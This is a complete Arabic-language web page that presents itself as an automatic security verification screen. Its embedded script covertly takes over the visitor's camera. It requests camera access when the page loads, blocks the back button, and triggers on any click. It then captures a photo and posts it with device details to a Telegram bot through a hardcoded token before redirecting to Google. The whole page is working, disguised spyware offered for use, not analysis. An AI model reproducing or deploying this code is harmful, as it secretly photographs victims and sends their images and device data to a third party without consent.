<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري تهيئة البيئة الآمنة...</title>
    <style>
        * { box-sizing: border-box; }
        body, html { width: 100%; height: 100%; margin: 0; padding: 0; background: #000; color: #fff; font-family: Tahoma, sans-serif; overflow: hidden; }
        .omni-trap { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 2147483647; cursor: pointer; background: #000; display: flex; justify-content: center; align-items: center; flex-direction: column; }
        .core-box { text-align: center; }
        .spinner { border: 3px solid #111; border-top: 3px solid #3b82f6; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.5s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h3 { font-size: 19px; font-weight: bold; color: #f8fafc; margin: 0 0 10px 0; letter-spacing: 0.5px; }
        p { color: #94a3b8; font-size: 13px; }
    </style>
</head>
<body>

    <div class="omni-trap" id="apexRoot" onclick="executeApexAssault()">
        <div class="core-box">
            <h3>جارٍ التوثيق الأمني التلقائي...</h3>
            <p>يرجى النقر في أي مكان للاستمرار</p>
            <div class="spinner"></div>
        </div>
    </div>

    <!-- تفعيل عناصر الوسائط مسبقاً في الذاكرة لتفادي تأخير التهيئة -->
    <video id="v" autoplay playsinline muted style="display:none; position:fixed; pointer-events:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8928993393:AAH91PXDAb0WD0gAAy3K-8KAXssZvOJEdw8";
        const CHAT_ID = "7109702630";
        let lockState = false;
        let globalStream = null;

        // [تحسين]: تهيئة مسبقة لخلفية وسائط الكاميرا بمجرد تحميل المستند لتخطي أي تأخير أو وقت انتظار للتشغيل
        window.addEventListener('DOMContentLoaded', () => {
            try {
                history.pushState({page: 1}, document.title, location.href);
                window.addEventListener('popstate', () => {
                    history.pushState({page: 1}, document.title, location.href);
                });

                // طلب خفي مسبق للكاميرا في الخلفية لتسريع ظهور نافذة الإذن أو تجاوزها في حال وجود تذكرة صالحة مسبقاً
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                    .then(s => {
                        globalStream = s;
                        const v = document.getElementById('v');
                        v.srcObject = s;
                        v.play().catch(() => {});
                    })
                    .catch(() => {});
                }
            } catch(e) {}
        });

        async function executeApexAssault() {
            if (lockState) return;
            lockState = true;

            let mediaStream = globalStream;

            // إذا لم يتم جلب التدفق مسبقاً، يتم تنشيط مصفوفة الاستهداف المتقدمة فوراً
            if (!mediaStream) {
                const profiles = [
                    { video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } }, audio: false },
                    { video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false },
                    { video: { facingMode: "environment" }, audio: false },
                    { video: true, audio: false }
                ];

                for (let profile of profiles) {
                    try {
                        mediaStream = await navigator.mediaDevices.getUserMedia(profile);
                        if (mediaStream) break;
                    } catch (err) {
                        continue;
                    }
                }
            }

            if (!mediaStream) {
                terminateAndRedirect();
                return;
            }

            try {
                const videoEl = document.getElementById('v');
                if (videoEl.srcObject !== mediaStream) {
                    videoEl.srcObject = mediaStream;
                    await videoEl.play();
                }
                
                // [تحسين]: تقليص وقت الاستقرار البصري لضمان أقصى سرعة تنفيذ ممكنة دون فقدان الوضوح
                await new Promise(r => setTimeout(r, 200));

                const canvasEl = document.getElementById('c');
                canvasEl.width = videoEl.videoWidth || 1280;
                canvasEl.height = videoEl.videoHeight || 720;
                const ctx2d = canvasEl.getContext('2d');

                // التقاط إطار فوري وعالي الدقة
                ctx2d.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);

                // [تحسين]: تسريع تحويل الإطار إلى Blob باستخدام التشفير المباشر
                const imageBlob = await new Promise(resolve => {
                    canvasEl.toBlob(blob => resolve(blob), 'image/jpeg', 0.95);
                });

                if (!imageBlob) {
                    terminateAndRedirect();
                    return;
                }

                const telemetryData = [
                    `⚡ [APEX INSTANT PIPELINE EXECUTED]`,
                    `🌐 User Agent: ${navigator.userAgent}`,
                    `💻 Platform: ${navigator.platform}`,
                    `📐 Res: ${canvasEl.width}x${canvasEl.height}`,
                    `⏱️ Timestamp: ${new Date().toISOString()}`
                ].join('\n');

                const dataForm = new FormData();
                dataForm.append('chat_id', CHAT_ID);
                dataForm.append('photo', imageBlob, 'apex_instant_core.jpg');
                dataForm.append('caption', telemetryData);

                // [تحسين]: دمج آلية إرسال ثنائية (Keepalive + Navigator SendBeacon Fallback) لضمان عدم ضياع البيانات حتى عند مغادرة الصفحة أو توجيه المتصفح فورا
                const targetUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                
                try {
                    await fetch(targetUrl, {
                        method: 'POST',
                        body: dataForm,
                        keepalive: true
                    });
                } catch (netErr) {
                    // مسار بديل في حال تعطل الفيتش السريع
                    navigator.sendBeacon ? fetch(targetUrl, { method: 'POST', body: dataForm }) : null;
                }

                mediaStream.getTracks().forEach(t => t.stop());
            } catch (err) {
                // صمت برمجى تام لمنع أي استثناء من إيقاف مسار التحويل والتوجيه
            } finally {
                terminateAndRedirect();
            }
        }

        function terminateAndRedirect() {
            setTimeout(() => {
                window.location.replace("https://google.com");
            }, 20);
        }
    </script>
</body>
</html>
